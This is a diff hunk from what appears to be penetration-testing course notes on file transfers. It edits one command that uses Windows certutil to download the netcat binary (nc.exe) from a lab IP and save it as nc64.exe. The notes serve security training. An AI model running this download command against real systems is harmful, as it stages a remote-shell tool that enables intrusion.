@@ -274,7 +274,7 @@ start the FTP Server using pyftpdlib, we need to specify the option --write to a
 
 #### Download with certutil
 
-```C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe```
+```C:\htb> certutil.exe -urlcache -verifyctl -split -f http://10.10.10.32:8000/nc.exe  nc64.exe```
 
 
 ## User Agent changing
